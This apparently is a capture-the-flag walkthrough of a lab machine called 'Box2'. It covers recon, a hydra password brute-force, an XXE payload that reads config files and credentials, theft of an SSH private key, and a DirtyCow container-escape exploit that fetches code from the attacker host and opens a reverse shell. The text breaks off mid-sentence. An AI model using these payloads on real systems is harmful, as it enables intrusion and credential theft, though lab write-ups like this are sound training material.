# Box2

## Recon

### Nmap

With an NMAP classical scan we identify 4 open ports

Port | Service
---- | ----
22   | SSH OpenSSH 6.7p1 
80   | Apache 2.4.10
10022| SSH OpenSSH 6.7p1 
11022| SSH OpenSSH 6.7p1 

## Web

### Enumeration


A quick scan with gobuster gives the following output
```bash
/.php                 (Status: 403) [Size: 292]
/index.php            (Status: 200) [Size: 6011]
/assets               (Status: 301) [Size: 315] [--> http://192.168.56.21/assets/]
/profile.php          (Status: 302) [Size: 1639] [--> index.php]
/includes             (Status: 301) [Size: 317] [--> http://192.168.56.21/includes/]
/login.php            (Status: 200) [Size: 1301]
/databases.php        (Status: 200) [Size: 2393]
/css                  (Status: 301) [Size: 312] [--> http://192.168.56.21/css/]
/js                   (Status: 301) [Size: 311] [--> http://192.168.56.21/js/]
/logout.php           (Status: 302) [Size: 0] [--> index.php]
/employees.php        (Status: 200) [Size: 5005]
```

**login.php**
We try an SQLInjection on both parameters without success

**employees.php**

We notice the iterator `employee_id`
```/employees.php?employee_id=42```

With the help of the burpsuite intruder we find a new page at `employee_id=42`

Carlos Sysadmin
`carlos@wingcorp.com`

### Bruteforce

**Carlos**

```bash
hydra -l carlos@wingcorp.com -P /usr/share/wordlists/rockyou.txt 192.168.56.21 http-post-form "/login.php:email=^USER^&password=^PASS^:F=Invalid Credentials."
```

We have a tag !

`carlos@wingcorp.com:sunshine1`

### XXE

With carlos profile we can now access the profile page. 

```xml
Cookie: PHPSESSID=n0ncs36q1rnt4fqb0ddd4p0037

<!DOCTYPE replace [<!ENTITY xxe SYSTEM
"php://filter/convert.base64-encode/resource=databases.php"> ]>
<profile><username>&xxe;</username><email>carlos@wingcorp.com</email><password>sunshine1</password></profile>
```

We can XXE to access any file in lecture where www-data have rights.

**/includes/config.php**

`/includes/config.php` gives us the database credentials

`admin:40xRpMT81Q2+oh9myhMP7w`

**/includes/leaks/php**
This files shows us that there is a webserver running on the hostname `backend` and that `?db={file}` could give us file reading on it

Trying `?db=/etc/passwd` reveals that carlos is an user of the machine.

Trying next `?db=/home/carlos/.ssh/id_rsa` gives us carlos ssh private key !

We should have an ssh access to potentially one of the three ssh ports availables

### SSH on port 11022

We have it !

flag.txt
```
0b4b6e37687ae744d506c9dc0fb32c8
```

## Privilege escalation carlos

### Enumeration

using linpeas.sh and LinEnum.sh, we only can find that we have high privilege on /run/systemd/container, but it seems useless. We can also notice that we are in a container judging by multiple aspects given in slides.

Otherwise some CVE are advised by the enumration scripts. It seems that our system kernel is vulnerable to the `DirtyCow` exploit.

Browsing the web we can found multiple exploits on dirtycow.ninja :

| Link | Usage | Description | Family |
|:---:|:---:|:---:|:---:|
| [dirtyc0w.c](https://github.com/dirtycow/dirtycow.github.io/blob/master/dirtyc0w.c) | `./dirtyc0w file content` | Read-only write | /proc/self/mem |
| [cowroot.c](https://gist.github.com/rverton/e9d4ff65d703a9084e85fa9df083c679) | `./cowroot` | SUID-based root | /proc/self/mem |
| [dirtycow-mem.c](https://gist.github.com/scumjr/17d91f20f73157c722ba2aea702985d2) | `./dirtycow-mem` | libc-based root | /proc/self/mem |
| [pokemon.c](https://github.com/dirtycow/dirtycow.github.io/blob/master/pokemon.c) | `./d file content` | Read-only write | PTRACE_POKEDATA |
| [dirtycow.cr](https://github.com/xlucas/dirtycow.cr) | `dirtycow --target --string --offset` | Read-only write | /proc/self/mem |
| [dirtyc0w.c](https://github.com/timwr/CVE-2016-5195) | `./dirtycow file content` | Read-only write (Android) | /proc/self/mem |
| [dirtycow.rb](https://github.com/rapid7/metasploit-framework/pull/7476) | `use exploit/linux/local/dirtycow` and `run` | SUID-based root | /proc/self/mem |
| [0xdeadbeef.c](https://github.com/scumjr/dirtycow-vdso) | `./0xdeadbeef` | vDSO-based root | PTRACE_POKEDATA |
| [naughtyc0w.c](https://gist.github.com/mak/c36136ccdbebf5ecfefd80c0f2ed6747) | `./c0w suid` | SUID-based root | /proc/self/mem |
| [c0w.c](https://gist.github.com/KrE80r/42f8629577db95782d5e4f609f437a54) | `./c0w` | SUID-based root | PTRACE_POKEDATA|
| [dirty_pass[...].c](https://gist.github.com/ngaro/05e084ca638340723b309cd304be77b2) | `./dirty_passwd_adjust_cow` | /etc/passwd based root | /proc/self/mem |
| [mucow.c](https://gist.github.com/chriscz/f1aca56cf15cfb7793db0141c15718cd) | `./mucow destination < payload.exe` | Read-only write (multi page) | PTRACE_POKEDATA |
| [cowpy.c](https://github.com/nowsecure/dirtycow) | `r2pm -i dirtycow` | Read-only write (radare2) | /proc/self/mem |
| [dirtycow.fasm](https://github.com/sivizius/dirtycow.fasm) | `./main` | SUID-based root | /proc/self/mem |
| [dcow.cpp](https://github.com/gbonacini/CVE-2016-5195) | `./dcow` | /etc/passwd based root | /proc/self/mem |
| [dirtyc0w.go](https://github.com/mengzhuo/dirty-cow-golang/blob/master/dirtyc0w.go) | `go run dirtyc0w.go -f=file -c=content` | Read-only write | /proc/self/mem |
| [dirty.c](https://github.com/FireFart/dirtycow/blob/master/dirty.c) | `./dirty` | /etc/passwd based root | PTRACE_POKEDATA |


We'll use the one that is interesting for us, the 0xdeadbeef that allow container escape, which could give us access to the entire machine.


### 0xdeadbeef.c

First lets clone the repo locally

```bash
git clone https://github.com/scumjr/dirtycow-vdso.git
```

This is C code, using Make to compile the exploit. After reading the docs, it seems that the exploit allows to open a reverse shell. We need to define in `0xdeadbeef.c` the parameter `PAYLOAD_IP` and `PAYLOAD_PORT`. After some debugging it appears that the IP must be at format `uint32_t`. Using an online converter we convert our IP to the correct number.

```bash
'192.168.56.3' | 3232249859
``` 

Now we have to use a non-filtered and non-used port to connect to our machine. Let's try port 80.

Since we have `make` in our container, lets upload the whole repo to the machine and compile it there.


**On our machine :**
compress files
```bash
tar -zcvf dirtycow-vdso.tar.gz .
```

start python server
```bash
python -m http.server 80
```

Don't forget to stop it and open a `nc -nvlp 80` before running the exploit

**On the container :**
get the archive
```bash
cd ~
wget 192.168.56.3/dirtycow-vdso.tar.gz
```

uncompress it
```bash
tar -zxvf dirtycow-vdso.tar.gz
```

compile it
```bash
cd dirtycow-vdso
make
```

run it
```bash
./0xdeadbeef
```

We have an error !

```bash
[*] payload target: 192.168.56.3:80
0xdeadbeef: failed to bind socket on port 80: Permission denied
```

Seems like we can't bind to 80, 